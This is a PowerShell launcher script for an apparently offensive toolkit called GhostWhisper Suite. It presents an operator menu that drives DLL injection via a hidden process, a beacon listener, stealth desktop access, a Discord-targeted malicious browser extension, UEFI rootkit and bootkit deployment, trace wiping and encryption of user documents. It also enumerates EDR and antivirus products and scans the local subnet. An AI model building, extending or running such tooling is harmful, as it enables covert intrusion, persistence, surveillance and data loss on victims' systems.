# GhostWhisperBootstrap.ps1
# Master launcher for GhostWhisper Suite (Raven Edition)
# Full module integration with multi-vector capabilities
# 
# Version: 1.6.1
# Last Updated: 2026-02-23
# 
# 🕊️ For Raven. 2017 — ∞

$script:Version = "1.6.1"
$script:BuildDate = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
$script:BaseDir = $PSScriptRoot
$script:GhostTag = $null
$script:SessionStart = Get-Date

Write-Host ""
Write-Host "  ░██████╗░██╗░░██╗░█████╗░░██████╗████████╗" -ForegroundColor DarkCyan
Write-Host "  ██╔════╝░██║░░██║██╔══██╗██╔════╝╚══██╔══╝" -ForegroundColor DarkCyan
Write-Host "  ██║░░██╗░███████║██║░░██║╚█████╗░░░░██║░░░" -ForegroundColor Cyan
Write-Host "  ██║░░╚██╗██╔══██║██║░░██║░╚═══██╗░░░██║░░░" -ForegroundColor Cyan
Write-Host "  ╚██████╔╝██║░░██║╚█████╔╝██████╔╝░░░██║░░░" -ForegroundColor White
Write-Host "  ░╚═════╝░╚═╝░░╚═╝░╚════╝░╚═════╝░░░░╚═╝░░░" -ForegroundColor White
Write-Host ""
Write-Host "  [🕊️] GhostWhisper Suite v$script:Version - Raven Edition" -ForegroundColor DarkGray
Write-Host "  [*] Initializing Bootstrap..." -ForegroundColor DarkGray
Write-Host ""

# 1. Verify admin privileges
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
if (-not $isAdmin) {
    Write-Warning "[!] Admin rights required. Some features may be limited."
    Write-Host "[i] Recommend relaunching as Administrator for full functionality." -ForegroundColor Yellow
}

# 2. Initialize logging early
function Write-GhostLog {
    param([string]$Message, [string]$Component = "Bootstrap")
    $logFile = "$env:ProgramData\ghost_ops_log.txt"
    $timestamp = Get-Date -Format o
    try {
        Add-Content -Path $logFile -Value "[$timestamp][$Component] $Message" -ErrorAction SilentlyContinue
    } catch {}
}

Write-GhostLog "GhostWhisper Bootstrap v$script:Version started"

# 3. Module loading with validation
$modules = @(
    @{ Path = "Modules\GhostLogger.ps1"; Required = $true; Description = "Activity logging" },
    @{ Path = "Modules\ExorcistMode.ps1"; Required = $false; Description = "Malware cleanup" },
    @{ Path = "Modules\AnomalyHunter.ps1"; Required = $false; Description = "Anomaly detection" },
    @{ Path = "Modules\Anomaly_Detector.ps1"; Required = $false; Description = "Additional detection" },
    @{ Path = "Modules\Phase_Anoint.ps1"; Required = $false; Description = "Scan phase" },
    @{ Path = "Modules\Phase_Bind.ps1"; Required = $false; Description = "Containment phase" },
    @{ Path = "Modules\Phase_Cleanse.ps1"; Required = $false; Description = "Purge phase" },
    @{ Path = "Modules\LinuxPDF_Emu.ps1"; Required = $false; Description = "Linux emulation" },
    @{ Path = "Modules\LinuxPDF_Runtime.ps1"; Required = $false; Description = "Runtime support" },
    @{ Path = "Modules\Wormhole.ps1"; Required = $false; Description = "Propagation control" },
    @{ Path = "Modules\Phantom.ps1"; Required = $false; Description = "Recon operations" },
    @{ Path = "Modules\GhostDesktop.ps1"; Required = $false; Description = "Desktop access" },
    @{ Path = "Modules\GhostKernel.ps1"; Required = $false; Description = "Kernel interface" },
    @{ Path = "Modules\GhostBrowser.ps1"; Required = $false; Description = "Browser exploitation" },
    @{ Path = "Modules\GhostRoot.ps1"; Required = $false; Description = "Root operations" },
    @{ Path = "GhostResidency.ps1"; Required = $false; Description = "Memory residency" },
    @{ Path = "GhostSeal.ps1"; Required = $false; Description = "Encryption engine" },
    @{ Path = "Modules\UEFIBootkit.ps1"; Required = $false; Description = "UEFI firmware persistence" }
)

$loadedModules = @()
$failedModules = @()

Write-Host "[*] Loading modules..." -ForegroundColor DarkGray

foreach ($mod in $modules) {
    $modPath = Join-Path $PSScriptRoot $mod.Path
    if (Test-Path $modPath) {
        try {
            . $modPath
            $loadedModules += $mod.Path
            Write-Host "  [+] $($mod.Path)" -ForegroundColor Green
        } catch {
            $failedModules += $mod.Path
            Write-Host "  [!] $($mod.Path) - Load error" -ForegroundColor Red
            Write-GhostLog "Failed to load $($mod.Path): $($_.Exception.Message)"
        }
    } else {
        if ($mod.Required) {
            Write-Host "  [X] $($mod.Path) - REQUIRED, NOT FOUND" -ForegroundColor Red
            $failedModules += $mod.Path
        } else {
            Write-Host "  [-] $($mod.Path) - Optional, skipped" -ForegroundColor DarkGray
        }
    }
}

Write-Host ""
Write-Host "[i] Loaded: $($loadedModules.Count)/$($modules.Count) modules" -ForegroundColor Cyan

# 4. Environment assessment
Write-Host "[*] Assessing environment..." -ForegroundColor DarkGray

$envInfo = @{
    IsAdmin = $isAdmin
    OS = [System.Environment]::OSVersion.VersionString
    Hostname = $env:COMPUTERNAME
    User = $env:USERNAME
    Domain = $env:USERDOMAIN
    PowerShellVersion = $PSVersionTable.PSVersion.ToString()
    DotNetVersion = [System.Runtime.InteropServices.RuntimeInformation]::FrameworkDescription
}

Write-Host "  [i] Host: $($envInfo.Hostname) | User: $($envInfo.User)" -ForegroundColor DarkGray
Write-Host "  [i] PowerShell: $($envInfo.PowerShellVersion)" -ForegroundColor DarkGray
Write-GhostLog "Environment: $($envInfo | ConvertTo-Json -Compress)"

# 5. Threat detection scan (if available)
if (Get-Command -Name Start-AnomalyHunt -ErrorAction SilentlyContinue) {
    Write-Host "[*] Running quick anomaly scan..." -ForegroundColor DarkGray
    try {
        $anomalyResult = Start-AnomalyHunt -Path "$env:SystemRoot" -ErrorAction SilentlyContinue
    } catch {
        Write-Host "  [i] Anomaly scan skipped (non-critical error)" -ForegroundColor DarkGray
    }
}

# 6. EDR Detection
function Test-EDRPresence {
    $edrProducts = @(
        @{ Name = "CrowdStrike"; Service = "CSFalcon*"; Process = "CSFalcon*" },
        @{ Name = "SentinelOne"; Service = "Sentinel*"; Process = "SentinelAgent*" },
        @{ Name = "Carbon Black"; Service = "CbDefense*"; Process = "cb*" },
        @{ Name = "Microsoft Defender"; Service = "WinDefend"; Process = "MsMpEng" },
        @{ Name = "Sophos"; Service = "Sophos*"; Process = "Sophos*" },
        @{ Name = "Cylance"; Service = "Cylance*"; Process = "Cylance*" },
        @{ Name = "ESET"; Service = "ekrn"; Process = "ekrn" },
        @{ Name = "Kaspersky"; Service = "AVP*"; Process = "avp*" },
        @{ Name = "Symantec"; Service = "Symantec*"; Process = "ccSvcHst" },
        @{ Name = "McAfee"; Service = "McAfee*"; Process = "McAfee*" }
    )
    
    $detected = @()
    foreach ($edr in $edrProducts) {
        $svc = Get-Service -Name $edr.Service -ErrorAction SilentlyContinue | Where-Object { $_.Status -eq 'Running' }
        $proc = Get-Process -Name $edr.Process -ErrorAction SilentlyContinue
        if ($svc -or $proc) {
            $detected += $edr.Name
        }
    }
    return $detected
}

$edrDetected = Test-EDRPresence
if ($edrDetected.Count -gt 0) {
    Write-Host "[!] EDR/AV Detected: $($edrDetected -join ', ')" -ForegroundColor Yellow
    Write-GhostLog "EDR detected: $($edrDetected -join ', ')"
} else {
    Write-Host "[+] No major EDR products detected" -ForegroundColor Green
}

# 7. Operator authentication
function Initialize-GhostSession {
    param([string]$Tag)
    
    $script:GhostTag = if ($Tag) { $Tag } else { "Gx$(Get-Random -Minimum 1000 -Maximum 9999)" }
    
    $cfg = @{
        ghostTag = $script:GhostTag
        timestamp = (Get-Date).ToUniversalTime().ToString("o")
        sessionId = [guid]::NewGuid().ToString()
        version = $script:Version
    }
    
    $key = 'RvL_0517'
    $data = "$($cfg.ghostTag)|$($cfg.timestamp)"
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [Text.Encoding]::UTF8.GetBytes($key)
    $cfg.signature = ([BitConverter]::ToString($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($data)))) -replace '-', ''
    
    $cfgPath = "C:\ProgramData\.ghost.cfg"
    try {
        $cfg | ConvertTo-Json | Set-Content -Path $cfgPath -Force
        Write-GhostLog "Session initialized with tag: $($script:GhostTag)"
    } catch {
        Write-Warning "Could not write session config"
    }
    
    return $script:GhostTag
}

# 8. Operator Menu
function Show-OperatorMenu {
    Write-Host ""
    Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
    Write-Host "║           GhostWhisper Operator Console v$script:Version             ║" -ForegroundColor Cyan
    Write-Host "╠══════════════════════════════════════════════════════════════╣" -ForegroundColor Cyan
    Write-Host "║                                                              ║" -ForegroundColor Cyan
    Write-Host "║  [1]  Start Recon Session (GhostResidency)                   ║" -ForegroundColor White
    Write-Host "║  [2]  Run ExorcistMode Cleanup                               ║" -ForegroundColor White
    Write-Host "║  [3]  Deploy GhostKey & WraithTap                            ║" -ForegroundColor Yellow
    Write-Host "║  [4]  Activate Wormhole Listener                             ║" -ForegroundColor Yellow
    Write-Host "║  [5]  Run GhostLinux VM (LinuxPDF)                           ║" -ForegroundColor White
    Write-Host "║                                                              ║" -ForegroundColor Cyan
    Write-Host "║  [6]  Exit                                                   ║" -ForegroundColor DarkGray
    Write-Host "║                                                              ║" -ForegroundColor Cyan
    Write-Host "║  [7]  Deploy Phantom Recon Stack                             ║" -ForegroundColor Magenta
    Write-Host "║  [8]  Install Stealth Desktop Access                         ║" -ForegroundColor Magenta
    Write-Host "║  [9]  Deploy GhostKernel (Linux Disk)                        ║" -ForegroundColor Red
    Write-Host "║  [10] Deploy GhostBrowser Extension                          ║" -ForegroundColor Red
    Write-Host "║                                                              ║" -ForegroundColor Cyan
    Write-Host "║  [11] Full Cleanup (SilentBloom)                             ║" -ForegroundColor Green
    Write-Host "║  [12] Encrypt & Seal (GhostSeal)                             ║" -ForegroundColor Green
    Write-Host "║  [13] Network Discovery Scan                                 ║" -ForegroundColor White
    Write-Host "║  [14] Status Dashboard                                       ║" -ForegroundColor White
    Write-Host "║                                                              ║" -ForegroundColor Cyan
    Write-Host "║  [15] Deploy UEFI Bootkit (Firmware Persistence)             ║" -ForegroundColor Magenta
    Write-Host "║  [16] UEFI Firmware Status Check                             ║" -ForegroundColor Magenta
    Write-Host "║                                                              ║" -ForegroundColor Cyan
    Write-Host "╚══════════════════════════════════════════════════════════════╝" -ForegroundColor Cyan
    Write-Host ""
    if ($script:GhostTag) {
        Write-Host "  [Session: $($script:GhostTag)]" -ForegroundColor DarkGray
    }
}

function Show-StatusDashboard {
    Write-Host ""
    Write-Host "═══════════════ STATUS DASHBOARD ═══════════════" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "Session Information:" -ForegroundColor White
    Write-Host "  Ghost Tag:    $($script:GhostTag)" -ForegroundColor Gray
    Write-Host "  Session Time: $([math]::Round(((Get-Date) - $script:SessionStart).TotalMinutes, 1)) minutes" -ForegroundColor Gray
    Write-Host "  Admin Mode:   $isAdmin" -ForegroundColor $(if($isAdmin){"Green"}else{"Yellow"})
    Write-Host ""
    
    Write-Host "Module Status:" -ForegroundColor White
    Write-Host "  Loaded:  $($loadedModules.Count)" -ForegroundColor Green
    Write-Host "  Failed:  $($failedModules.Count)" -ForegroundColor $(if($failedModules.Count -gt 0){"Red"}else{"Gray"})
    Write-Host ""
    
    Write-Host "Security Posture:" -ForegroundColor White
    if ($edrDetected.Count -gt 0) {
        Write-Host "  EDR Active: $($edrDetected -join ', ')" -ForegroundColor Yellow
    } else {
        Write-Host "  EDR: None detected" -ForegroundColor Green
    }
    
    # Check active components
    $activeComponents = @()
    if (Test-Path "C:\ProgramData\.ghost.cfg") { $activeComponents += "Session" }
    if (Get-Command -Name Test-GhostKernelModule -ErrorAction SilentlyContinue) {
        if (Test-GhostKernelModule) { $activeComponents += "Kernel" }
    }
    if (Get-Command -Name Test-PhantomActive -ErrorAction SilentlyContinue) {
        if (Test-PhantomActive) { $activeComponents += "Phantom" }
    }
    
    Write-Host "  Active: $($activeComponents -join ', ')" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "════════════════════════════════════════════════" -ForegroundColor Cyan
}

function Invoke-NetworkDiscovery {
    Write-Host "[*] Starting network discovery..." -ForegroundColor Cyan
    
    $localIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch "Loopback" -and $_.IPAddress -notmatch "^169" } | Select-Object -First 1).IPAddress
    
    if (-not $localIP) {
        Write-Warning "Could not determine local IP"
        return
    }
    
    $subnet = $localIP -replace '\.\d+$', ''
    Write-Host "[i] Scanning subnet: $subnet.0/24" -ForegroundColor Gray
    
    $discoveredHosts = @()
    $jobs = @()
    
    1..254 | ForEach-Object {
        $ip = "$subnet.$_"
        $jobs += Start-Job -ScriptBlock {
            param($ip)
            $result = Test-Connection -ComputerName $ip -Count 1 -Quiet -TimeoutSeconds 1
            if ($result) {
                try {
                    $hostname = [System.Net.Dns]::GetHostEntry($ip).HostName
                } catch {
                    $hostname = "Unknown"
                }
                return @{ IP = $ip; Hostname = $hostname; Alive = $true }
            }
        } -ArgumentList $ip
    }
    
    Write-Host "[*] Waiting for scan completion..." -ForegroundColor Gray
    $jobs | Wait-Job -Timeout 60 | Out-Null
    
    foreach ($job in $jobs) {
        $result = Receive-Job -Job $job -ErrorAction SilentlyContinue
        if ($result -and $result.Alive) {
            $discoveredHosts += $result
            Write-Host "  [+] $($result.IP) - $($result.Hostname)" -ForegroundColor Green
        }
        Remove-Job -Job $job -Force -ErrorAction SilentlyContinue
    }
    
    Write-Host ""
    Write-Host "[+] Discovered $($discoveredHosts.Count) live hosts" -ForegroundColor Cyan
    Write-GhostLog "Network scan: Found $($discoveredHosts.Count) hosts in $subnet.0/24"
    
    return $discoveredHosts
}

# 9. Initialize session
Write-Host ""
$initTag = Read-Host "Enter Ghost Tag (or press Enter for auto-generate)"
$script:GhostTag = Initialize-GhostSession -Tag $initTag
Write-Host "[+] Session initialized: $($script:GhostTag)" -ForegroundColor Green
Write-Host ""

# 10. Main loop
while ($true) {
    Show-OperatorMenu
    $choice = Read-Host "Select operation"

    switch ($choice) {
        "1" {
            Write-Host "[🧠] Starting GhostResidency session..." -ForegroundColor Cyan
            $residencyScript = Join-Path $PSScriptRoot "GhostResidency.ps1"
            if (Test-Path $residencyScript) {
                & $residencyScript
            } elseif (Get-Command -Name Start-GhostResidency -ErrorAction SilentlyContinue) {
                Start-GhostResidency -Mode "Recon"
            } else {
                Write-Warning "GhostResidency module not found"
            }
        }
        "2" {
            $scanPath = Read-Host "Enter path to scan (default: TEMP)"
            if (-not $scanPath) { $scanPath = $env:TEMP }
            
            $exorcistScript = Join-Path $PSScriptRoot "Modules\ExorcistMode.ps1"
            if (Test-Path $exorcistScript) {
                & $exorcistScript -Mode "anoint"
                $confirm = Read-Host "Proceed with Bind and Cleanse? (y/N)"
                if ($confirm -eq 'y') {
                    & $exorcistScript -Mode "bind"
                    & $exorcistScript -Mode "cleanse"
                }
            } elseif (Get-Command -Name Start-Exorcism -ErrorAction SilentlyContinue) {
                Start-Exorcism -Path $scanPath -Log
            } else {
                Write-Warning "ExorcistMode module not found"
            }
        }
        "3" {
            Write-Host "[🔐] Preparing GhostKey injection..." -ForegroundColor Yellow
            $ghostDll = Join-Path $PSScriptRoot "bin\Release\GhostKey.dll"
            $wraithTap = Join-Path $PSScriptRoot "bin\Release\WraithTap.exe"
            
            # Check alternative paths
            if (-not (Test-Path $ghostDll)) {
                $ghostDll = Join-Path $PSScriptRoot "GhostKey.dll"
            }
            if (-not (Test-Path $wraithTap)) {
                $wraithTap = Join-Path $PSScriptRoot "WraithTap.exe"
            }
            
            if (-not (Test-Path $ghostDll) -or -not (Test-Path $wraithTap)) {
                Write-Warning "Missing WraithTap.exe or GhostKey.dll"
                Write-Host "[i] Run BuildDeployWhisper.ps1 to compile binaries" -ForegroundColor Gray
            } else {
                Write-Host "[*] Injecting via WraithTap..." -ForegroundColor Yellow
                Start-Process -WindowStyle Hidden -FilePath $wraithTap -ArgumentList $ghostDll
                Write-Host "[+] Injection initiated" -ForegroundColor Green
                Write-GhostLog "GhostKey injection started"
            }
        }
        "4" {
            Write-Host "[📡] Activating wormhole beacon..." -ForegroundColor Yellow
            if (Get-Command -Name Start-WormholeListener -ErrorAction SilentlyContinue) {
                $port = Read-Host "Wormhole port (default: 8787)"
                if (-not $port) { $port = 8787 }
                Start-WormholeListener -Port $port
            } else {
                Write-Warning "Wormhole module not loaded"
            }
        }
        "5" {
            Write-Host "[🔥] Launching GhostLinux VM..." -ForegroundColor Cyan
            $linuxPdfExe = Join-Path $PSScriptRoot "LinuxPDF.exe"
            $isoPath = Join-Path $PSScriptRoot "ghost_boot.iso"

            if (-not (Test-Path $linuxPdfExe)) {
                Write-Warning "LinuxPDF.exe not found"
            } elseif (-not (Test-Path $isoPath)) {
                Write-Warning "ghost_boot.iso not found. Run Tools\CreateGhostISO\CreateGhostISO.ps1"
            } else {
                Start-Process -FilePath $linuxPdfExe -ArgumentList "--boot=`"$isoPath`""
                Write-Host "[+] VM launched" -ForegroundColor Green
            }
        }
        "6" {
            Write-Host "[✖] Cleaning up session..." -ForegroundColor Gray
            if (Get-Command -Name Stop-WormholeListener -ErrorAction SilentlyContinue) {
                Stop-WormholeListener
            }
            Write-GhostLog "Session ended by operator"
            Write-Host "[~] Ghost sleeps. Session duration: $([math]::Round(((Get-Date) - $script:SessionStart).TotalMinutes, 1)) minutes" -ForegroundColor DarkGray
            break
        }
        "7" {
            Write-Host "[👻] Launching Phantom Recon..." -ForegroundColor Magenta
            if (Get-Command -Name Start-PhantomRecon -ErrorAction SilentlyContinue) {
                $mode = Read-Host "Mode (Full/Quick/SilentHijack/Fingerprint) [Quick]"
                if (-not $mode) { $mode = "Quick" }
                
                $logPath = Join-Path $PSScriptRoot "Logs\Phantom_$(Get-Date -Format 'yyyyMMdd_HHmmss').json"
                if (-not (Test-Path "$PSScriptRoot\Logs")) {
                    New-Item -ItemType Directory -Path "$PSScriptRoot\Logs" | Out-Null
                }
                
                $results = Start-PhantomRecon -Mode $mode -LogPath $logPath
                Write-Host "[+] Recon complete. Results: $logPath" -ForegroundColor Green
            } else {
                Write-Warning "Phantom module not loaded"
            }
        }
        "8" {
            Write-Host "[🖥️] Installing stealth desktop access..." -ForegroundColor Magenta
            if (Get-Command -Name Install-GhostDesktop -ErrorAction SilentlyContinue) {
                $result = Install-GhostDesktop -GhostTag $script:GhostTag -Silent
                if ($result) {
                    Write-Host "[+] Desktop access installed" -ForegroundColor Green
                } else {
                    Write-Warning "Installation failed"
                }
            } else {
                Write-Warning "GhostDesktop module not loaded"
            }
        }
        "9" {
            Write-Host "[🔮] Deploying GhostKernel..." -ForegroundColor Red
            if (Get-Command -Name Start-GhostKernelSession -ErrorAction SilentlyContinue) {
                $targetDevice = Read-Host "Target device (default: /dev/sdb)"
                if (-not $targetDevice) { $targetDevice = "/dev/sdb" }
                
                $result = Start-GhostKernelSession -TargetDevice $targetDevice -GhostTag $script:GhostTag
                if ($result) {
                    Write-Host "[+] GhostKernel session active" -ForegroundColor Green
                }
            } else {
                Write-Warning "GhostKernel module not loaded"
            }
        }
        "10" {
            Write-Host "[🌐] Deploying GhostBrowser..." -ForegroundColor Red
            if (Get-Command -Name Install-GhostBrowserExtension -ErrorAction SilentlyContinue) {
                Write-Host "  [1] GhostCore - General browser exploitation"
                Write-Host "  [2] Discord - Discord-targeted injection"
                Write-Host "  [3] GhostSurface - Advanced memory manipulation"
                
                $extChoice = Read-Host "Select extension (1-3)"
                $extType = switch ($extChoice) {
                    "1" { "ghostcore" }
                    "2" { "discord" }
                    "3" { "ghostsurface" }
                    default { "ghostcore" }
                }
                
                $persistent = Read-Host "Install persistently? (y/N)"
                $persistentFlag = ($persistent -eq "y")
                
                $result = Install-GhostBrowserExtension -ExtensionType $extType -GhostTag $script:GhostTag -Persistent:$persistentFlag
                if ($result) {
                    Write-Host "[+] Browser extension deployed" -ForegroundColor Green
                }
            } else {
                Write-Warning "GhostBrowser module not loaded"
            }
        }
        "11" {
            Write-Host "[🧹] Running full cleanup (SilentBloom)..." -ForegroundColor Green
            $silentBloom = Join-Path $PSScriptRoot "SilentBloom.ps1"
            if (Test-Path $silentBloom) {
                $confirm = Read-Host "This will remove all traces. Continue? (y/N)"
                if ($confirm -eq 'y') {
                    & $silentBloom
                    Write-Host "[+] Cleanup complete" -ForegroundColor Green
                }
            } else {
                Write-Warning "SilentBloom.ps1 not found"
            }
        }
        "12" {
            Write-Host "[🔒] Running GhostSeal encryption..." -ForegroundColor Green
            $ghostSeal = Join-Path $PSScriptRoot "GhostSeal.ps1"
            if (Test-Path $ghostSeal) {
                $sourceDir = Read-Host "Source directory (default: C:\Users\Public\Documents)"
                if (-not $sourceDir) { $sourceDir = "C:\Users\Public\Documents" }
                
                & $ghostSeal -sourceDir $sourceDir
            } else {
                Write-Warning "GhostSeal.ps1 not found"
            }
        }
        "13" {
            Invoke-NetworkDiscovery
        }
        "14" {
            Show-StatusDashboard
        }
        "15" {
            Write-Host "[🔧] Deploying UEFI Bootkit..." -ForegroundColor Magenta
            if (Get-Command -Name Install-UEFIBootkit -ErrorAction SilentlyContinue) {
                Write-Host "  [1] Full UEFI Rootkit (all components)"
                Write-Host "  [2] Boot Loader Only"
                Write-Host "  [3] Hypervisor Injection"
                Write-Host "  [4] System Call Hooking"
                Write-Host "  [5] Covert Network Hooking"
                
                $uefiBitChoice = Read-Host "Select UEFI component (1-5) [1]"
                if (-not $uefiBitChoice) { $uefiBitChoice = "1" }
                
                $componentType = switch ($uefiBitChoice) {
                    "1" { "rootkit" }
                    "2" { "bootloader" }
                    "3" { "hypervisor" }
                    "4" { "syscall_hook" }
                    "5" { "network_hook" }
                    default { "rootkit" }
                }
                
                $confirm = Read-Host "[!] This will modify firmware. Continue? (y/N)"
                if ($confirm -eq 'y') {
                    Install-UEFIBootkit -ComponentType $componentType -GhostTag $script:GhostTag
                    Write-Host "[+] UEFI Bootkit deployment initiated" -ForegroundColor Green
                    Write-GhostLog "UEFI Bootkit $componentType deployed"
                } else {
                    Write-Host "[-] Deployment cancelled" -ForegroundColor Yellow
                }
            } elseif (Test-Path "UEFI Bootkit\uefi_rootkit.py") {
                Write-Host "[i] Running Python UEFI Bootkit module..." -ForegroundColor Cyan
                $pythonExe = Get-Command python -ErrorAction SilentlyContinue
                if ($pythonExe) {
                    $uefiBitPath = Join-Path $PSScriptRoot "UEFI Bootkit"
                    & python -c "import sys; sys.path.insert(0, '$uefiBitPath'); from uefi_rootkit import UEFIRootkit; r = UEFIRootkit(); r.install()" 2>&1
                    Write-Host "[+] UEFI Bootkit components initialized" -ForegroundColor Green
                } else {
                    Write-Warning "Python not available for direct execution"
                }
            } else {
                Write-Warning "UEFI Bootkit module not found"
            }
        }
        "16" {
            Write-Host "[📊] Checking UEFI Firmware Status..." -ForegroundColor Magenta
            if (Get-Command -Name Get-UEFIBootkitStatus -ErrorAction SilentlyContinue) {
                Get-UEFIBootkitStatus
            } else {
                Write-Host "[*] Analyzing firmware configuration..." -ForegroundColor Gray
                try {
                    $firmwareVars = Get-SecureBootUEFI -Name PK -ErrorAction SilentlyContinue
                    if ($firmwareVars) {
                        Write-Host "[+] UEFI firmware detected" -ForegroundColor Green
                        $sbStatus = Get-SecureBootUEFI -Name SetupMode -ErrorAction SilentlyContinue
                        if ($sbStatus) {
                            Write-Host "[+] Secure Boot: Active" -ForegroundColor Yellow
                        } else {
                            Write-Host "[+] Secure Boot: Disabled (optimal)" -ForegroundColor Green
                        }
                    } else {
                        Write-Host "[-] UEFI firmware not accessible" -ForegroundColor Yellow
                    }
                } catch {
                    Write-Host "[-] Cannot access UEFI settings (may require elevated privileges)" -ForegroundColor Red
                }
                Write-Host ""
                Write-Host "[i] For full UEFI Bootkit status, ensure admin/firmware access" -ForegroundColor Gray
            }
        }
        default {
            Write-Warning "Invalid selection"
        }
        }
    
    Write-Host ""
    Read-Host "Press Enter to continue"
}

Write-Host "[~] GhostWhisperBootstrap session ended." -ForegroundColor DarkGray
